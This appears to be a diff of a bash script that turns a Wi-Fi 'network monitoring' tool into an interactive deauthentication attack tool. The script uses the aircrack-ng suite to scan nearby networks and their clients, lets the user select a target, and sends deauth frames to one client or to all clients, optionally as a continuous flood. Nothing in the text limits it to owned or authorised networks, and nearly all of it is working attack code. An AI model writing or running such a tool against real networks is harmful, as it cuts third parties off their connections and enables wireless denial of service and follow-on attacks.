@@ -1,76 +1,162 @@
 #!/bin/bash
 
-# Network Monitoring Script
+# Network Deauthentication Script
+# This script allows monitoring wireless networks and performing deauthentication attacks
+
+# Colors for better readability
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Variables
+TEMP_DIR="/tmp/netdeauth_$$"
+MONITOR_INTERFACE=""
+TARGET_BSSID=""
+TARGET_CHANNEL=""
+TARGET_ESSID=""
 
 # Check if running as root
 if [ "$EUID" -ne 0 ]; then
-  echo "Please run as root"
+  echo -e "${RED}Error: Please run as root${NC}"
   exit 1
 fi
 
+# Check for required tools
+check_requirements() {
+    local tools=("airmon-ng" "airodump-ng" "aireplay-ng")
+    local missing=0
+    
+    echo -e "${BLUE}Checking requirements...${NC}"
+    for tool in "${tools[@]}"; do
+        if ! command -v "$tool" &>/dev/null; then
+            echo -e "${RED}Missing required tool: $tool${NC}"
+            missing=1
+        fi
+    done
+    
+    if [ $missing -eq 1 ]; then
+        echo -e "${RED}Please install Aircrack-ng suite: apt install aircrack-ng${NC}"
+        exit 1
+    fi
+    
+    # Create temp directory
+    mkdir -p "$TEMP_DIR"
+}
+
+# Show help message
+show_help() {
+    echo -e "${GREEN}Network Deauthentication Script${NC}"
+    echo "Usage: $0 [options]"
+    echo ""
+    echo "Options:"
+    echo "  -h, --help     Show this help message"
+    echo "  -i INTERFACE   Specify wireless interface"
+    echo ""
+    echo "Run without options for interactive mode"
+    exit 0
+}
+
+# Parse command line arguments
+parse_args() {
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            -h|--help)
+                show_help
+                ;;
+            -i)
+                interface=$2
+                shift
+                ;;
+            *)
+                echo -e "${RED}Unknown option: $1${NC}"
+                show_help
+                ;;
+        esac
+        shift
+    done
+}
+
 # Function to display available network interfaces
 show_interfaces() {
-    echo "Available network interfaces:"
-    ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | sed 's/^ //'
+    echo -e "${BLUE}Available wireless interfaces:${NC}"
+    ip link show | grep -E '^[0-9]+:' | grep -i wireless | cut -d: -f2 | sed 's/^ //'
+    
+    # If no wireless interfaces found, show all interfaces
+    if [ $? -ne 0 ]; then
+        echo -e "${YELLOW}No wireless interfaces found, showing all interfaces:${NC}"
+        ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | sed 's/^ //'
+    fi
 }
 
 # Function to select network interface
 select_interface() {
-    show_interfaces
-    echo "Enter the interface name to use:"
-    read interface
+    if [ -n "$interface" ]; then
+        echo -e "${BLUE}Using specified interface: $interface${NC}"
+    else
+        show_interfaces
+        echo -e "${GREEN}Enter the interface name to use:${NC}"
+        read interface
+    fi
     
     # Check if interface exists
     if ! ip link show "$interface" &>/dev/null; then
-        echo "Interface $interface does not exist."
+        echo -e "${RED}Interface $interface does not exist.${NC}"
         return 1
     fi
     
     # Put interface in monitor mode
-    echo "Putting $interface into monitor mode..."
-    airmon-ng check kill
-    airmon-ng start "$interface"
+    echo -e "${BLUE}Putting $interface into monitor mode...${NC}"
+    airmon-ng check kill >/dev/null
+    airmon-ng start "$interface" >/dev/null
     
     # Get the monitor interface name (usually interface + mon)
-    monitor_interface="${interface}mon"
-    if ! ip link show "$monitor_interface" &>/dev/null; then
-        monitor_interface="$interface"
+    MONITOR_INTERFACE="${interface}mon"
+    if ! ip link show "$MONITOR_INTERFACE" &>/dev/null; then
+        # Some drivers use the same interface name in monitor mode
+        MONITOR_INTERFACE="$interface"
     fi
     
-    echo "Monitor interface: $monitor_interface"
+    echo -e "${GREEN}Monitor interface: $MONITOR_INTERFACE${NC}"
     return 0
 }
 
 # Function to scan for networks using airodump-ng
 scan_networks() {
-    echo "Scanning for wireless networks on $monitor_interface..."
-    echo "Press Ctrl+C when you want to stop scanning."
+    echo -e "${BLUE}Scanning for wireless networks on $MONITOR_INTERFACE...${NC}"
+    echo -e "${YELLOW}Press Enter when you want to stop scanning.${NC}"
     
-    # Create a temporary file to store scan results
-    temp_file="/tmp/network_scan.csv"
+    # Create temporary files for scan results
+    SCAN_FILE="$TEMP_DIR/network_scan"
     
-    # Start airodump-ng in another terminal
-    airodump-ng -w "$temp_file" --output-format csv "$monitor_interface" &
+    # Start airodump-ng in background
+    airodump-ng -w "$SCAN_FILE" --output-format csv "$MONITOR_INTERFACE" >/dev/null 2>&1 &
     airodump_pid=$!
     
-    # Wait for user to press Ctrl+C
-    echo "Scanning in progress. Press Enter to stop..."
+    # Wait for user to press Enter
     read
     
     # Kill airodump-ng
     kill $airodump_pid 2>/dev/null
+    wait $airodump_pid 2>/dev/null
     
     # Parse and display networks from CSV file
-    if [ -f "${temp_file}-01.csv" ]; then
-        echo "Available networks:"
-        # Skip header line and empty lines, then display networks with their BSSIDs
-        networks=$(grep -a -v "^$" "${temp_file}-01.csv" | tail -n +2 | awk -F, '{print NR". BSSID: "$1" Channel: "$4" ESSID: "$14}')
-        echo "$networks"
+    if [ -f "${SCAN_FILE}-01.csv" ]; then
+        echo -e "${GREEN}Available networks:${NC}"
         
-        # Store the networks for later use
-        echo "$networks" > /tmp/available_networks.txt
+        # Process the CSV file to get networks
+        # Skip header line and empty lines, then display networks with their details
+        grep -a -v "^$" "${SCAN_FILE}-01.csv" | tail -n +2 | \
+            awk -F, '{gsub(/ /, "", $1); gsub(/ /, "", $4); gsub(/^ | $/, "", $14); 
+                      printf "%-3s %-18s %-4s %-4s %s\n", NR".", $1, "Ch:"$4, "Pwr:"$6, $14}' > "$TEMP_DIR/available_networks.txt"
+        
+        # Display networks with color
+        cat "$TEMP_DIR/available_networks.txt" | while read line; do
+            echo -e "${BLUE}$line${NC}"
+        done
     else
-        echo "No networks found or scan interrupted."
+        echo -e "${RED}No networks found or scan interrupted.${NC}"
         return 1
     fi
     
@@ -79,118 +165,195 @@ scan_networks() {
 
 # Function to select target network
 select_target() {
-    echo "Enter the number of the network to target:"
+    echo -e "${GREEN}Enter the number of the network to target:${NC}"
     read target_num
     
-    # Get the selected network's BSSID and channel
-    selected=$(sed -n "${target_num}p" /tmp/available_networks.txt)
+    # Get the selected network's info
+    selected=$(sed -n "${target_num}p" "$TEMP_DIR/available_networks.txt")
     
     if [ -z "$selected" ]; then
-        echo "Invalid selection."
+        echo -e "${RED}Invalid selection.${NC}"
         return 1
     fi
     
-    # Extract BSSID and channel
-    target_bssid=$(echo "$selected" | grep -oE "BSSID: ([0-9A-F:]{17})" | cut -d' ' -f2)
-    target_channel=$(echo "$selected" | grep -oE "Channel: ([0-9]+)" | cut -d' ' -f2)
-    target_essid=$(echo "$selected" | grep -oE "ESSID: ([^ ]+)$" | cut -d' ' -f2)
+    # Extract BSSID, channel and ESSID
+    TARGET_BSSID=$(echo "$selected" | awk '{print $2}')
+    TARGET_CHANNEL=$(echo "$selected" | awk '{print $4}' | cut -d':' -f2)
+    TARGET_ESSID=$(echo "$selected" | awk '{$1=$2=$3=$4=""; print $0}' | sed 's/^ *//')
     
-    echo "Selected target network: $target_essid (BSSID: $target_bssid, Channel: $target_channel)"
+    echo -e "${GREEN}Selected target network: ${BLUE}$TARGET_ESSID${NC} (BSSID: ${BLUE}$TARGET_BSSID${NC}, Channel: ${BLUE}$TARGET_CHANNEL${NC})"
     
     # Get clients of the selected network
-    echo "Scanning for clients on $target_essid..."
-    echo "Press Enter to stop scanning for clients..."
+    echo -e "${BLUE}Scanning for clients on $TARGET_ESSID...${NC}"
+    echo -e "${YELLOW}Press Enter to stop scanning for clients...${NC}"
     
     # Start targeted scan
-    airodump-ng -c "$target_channel" --bssid "$target_bssid" -w "/tmp/client_scan" --output-format csv "$monitor_interface" &
+    CLIENT_SCAN_FILE="$TEMP_DIR/client_scan"
+    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$CLIENT_SCAN_FILE" --output-format csv "$MONITOR_INTERFACE" >/dev/null 2>&1 &
     client_scan_pid=$!
     
     read
     
     # Kill the client scan
     kill $client_scan_pid 2>/dev/null
+    wait $client_scan_pid 2>/dev/null
     
     # Parse and display clients
-    if [ -f "/tmp/client_scan-01.csv" ]; then
+    if [ -f "${CLIENT_SCAN_FILE}-01.csv" ]; then
         # Skip to the "Station MAC" section and display clients
-        clients=$(awk -F, '/Station MAC/{flag=1;next} flag' "/tmp/client_scan-01.csv" | grep -v "^$" | awk -F, '{print NR". Client MAC: "$1" Power: "$4}')
+        awk -F, '/Station MAC/{flag=1;next} flag' "${CLIENT_SCAN_FILE}-01.csv" | \
+            grep -v "^$" | awk -F, '{gsub(/ /, "", $1); 
+                      printf "%-3s %-18s %-10s\n", NR".", $1, "Power:"$4}' > "$TEMP_DIR/available_clients.txt"
         
-        if [ -z "$clients" ]; then
-            echo "No clients found for this network."
-            return 1
+        # Check if we found any clients
+        if [ ! -s "$TEMP_DIR/available_clients.txt" ]; then
+            echo -e "${YELLOW}No clients found for this network.${NC}"
+            echo "0. Continue anyway (broadcast deauth)"
+            echo "1. Scan again for clients"
+            echo "2. Select another network"
+            echo "3. Quit"
+            read -p "Select option [0-3]: " client_option
+            
+            case $client_option in
+                0) return 0 ;;
+                1) select_target; return $? ;;
+                2) scan_networks && select_target; return $? ;;
+                *) echo -e "${RED}Quitting...${NC}"; return 1 ;;
+            esac
         fi
         
-        echo "Found clients:"
-        echo "$clients"
-        echo "$clients" > /tmp/available_clients.txt
+        echo -e "${GREEN}Found clients:${NC}"
+        cat "$TEMP_DIR/available_clients.txt" | while read line; do
+            echo -e "${BLUE}$line${NC}"
+        done
+        return 0
     else
-        echo "No client scan data available."
+        echo -e "${RED}No client scan data available.${NC}"
         return 1
     fi
-    
-    return 0
 }
 
 # Function to perform deauth attack
 perform_deauth() {
-    echo "Select client to deauthenticate (enter number or 'all' for all clients):"
+    local packet_count
+    local continuous
+    
+    echo -e "${GREEN}Enter number of deauth packets to send (0 for continuous):${NC}"
+    read packet_count
+    
+    if [ "$packet_count" -eq 0 ]; then
+        continuous=1
+        packet_count=0
+    else
+        continuous=0
+    fi
+    
+    echo -e "${GREEN}Select client to deauthenticate:${NC}"
+    echo "0. All clients (broadcast deauth)"
+    
+    # Show clients if available
+    if [ -s "$TEMP_DIR/available_clients.txt" ]; then
+        cat "$TEMP_DIR/available_clients.txt" | while read line; do
+            echo -e "${BLUE}$line${NC}"
+        done
+    fi
+    
     read client_choice
     
-    if [ "$client_choice" = "all" ]; then
-        echo "Sending deauthentication packets to all clients..."
-        aireplay-ng --deauth 10 -a "$target_bssid" "$monitor_interface"
+    if [ "$client_choice" = "0" ]; then
+        echo -e "${YELLOW}Sending deauthentication packets to all clients...${NC}"
+        if [ $continuous -eq 1 ]; then
+            echo -e "${RED}Press Ctrl+C to stop the attack${NC}"
+            aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
+        else
+            aireplay-ng --deauth "$packet_count" -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
+        fi
     else
         # Get the selected client MAC
-        selected_client=$(sed -n "${client_choice}p" /tmp/available_clients.txt)
+        selected_client=$(sed -n "${client_choice}p" "$TEMP_DIR/available_clients.txt")
         
         if [ -z "$selected_client" ]; then
-            echo "Invalid selection."
+            echo -e "${RED}Invalid selection.${NC}"
             return 1
         fi
         
-        client_mac=$(echo "$selected_client" | grep -oE "Client MAC: ([0-9A-F:]{17})" | cut -d' ' -f3)
-        echo "Sending deauthentication packets to client $client_mac..."
-        aireplay-ng --deauth 10 -a "$target_bssid" -c "$client_mac" "$monitor_interface"
+        client_mac=$(echo "$selected_client" | awk '{print $2}')
+        echo -e "${YELLOW}Sending deauthentication packets to client $client_mac...${NC}"
+        
+        if [ $continuous -eq 1 ]; then
+            echo -e "${RED}Press Ctrl+C to stop the attack${NC}"
+            aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"
+        else
+            aireplay-ng --deauth "$packet_count" -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"
+        fi
     fi
     
+    echo -e "${GREEN}Deauth attack completed.${NC}"
     return 0
 }
 
 # Function to clean up
 cleanup() {
-    echo "Cleaning up..."
-    # Stop monitor mode
-    airmon-ng stop "$monitor_interface" 2>/dev/null
+    echo -e "${BLUE}Cleaning up...${NC}"
     
-    # Remove temporary files
-    rm -f "/tmp/network_scan-01.csv" "/tmp/available_networks.txt" "/tmp/client_scan-01.csv" "/tmp/available_clients.txt"
+    # Stop monitor mode if we created a monitor interface
+    if [ -n "$MONITOR_INTERFACE" ]; then
+        echo -e "${BLUE}Stopping monitor mode on $MONITOR_INTERFACE...${NC}"
+        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
+    fi
     
-    echo "Done."
-    exit 0
+    # Remove temporary directory
+    if [ -d "$TEMP_DIR" ]; then
+        rm -rf "$TEMP_DIR"
+    fi
+    
+    echo -e "${GREEN}Done.${NC}"
 }
 
 # Set up trap to clean up on exit
 trap cleanup EXIT INT TERM
 
-# Main program
-echo "Network Monitoring Script"
-echo "------------------------"
-
-# Initialize variables
-monitor_interface=""
-target_bssid=""
-target_channel=""
-
-# Run functions
-select_interface
-if [ $? -eq 0 ]; then
-    scan_networks
-    if [ $? -eq 0 ]; then
-        select_target
-        if [ $? -eq 0 ]; then
-            perform_deauth
+# Main function to control program flow
+main() {
+    echo -e "${GREEN}========================================${NC}"
+    echo -e "${GREEN}   Network Deauthentication Script      ${NC}"
+    echo -e "${GREEN}========================================${NC}"
+    
+    check_requirements
+    parse_args "$@"
+    
+    # Main program loop
+    while true; do
+        if select_interface; then
+            if scan_networks; then
+                if select_target; then
+                    perform_deauth
+                    
+                    echo -e "${GREEN}What would you like to do next?${NC}"
+                    echo "1. Perform another deauth attack on same network"
+                    echo "2. Select another network"
+                    echo "3. Select another interface"
+                    echo "4. Exit"
+                    read -p "Select option [1-4]: " next_action
+                    
+                    case $next_action in
+                        1) continue ;;
+                        2) scan_networks; continue ;;
+                        3) break ;;
+                        *) echo -e "${BLUE}Exiting...${NC}"; exit 0 ;;
+                    esac
+                fi
+            fi
         fi
-    fi
-fi
+        
+        echo -e "${GREEN}Would you like to try again? (y/n)${NC}"
+        read try_again
+        if [[ ! "$try_again" =~ ^[Yy] ]]; then
+            echo -e "${BLUE}Exiting...${NC}"
+            exit 0
+        fi
+    done
+}
 
-echo "Script completed."
+# Start the program
+main "$@"
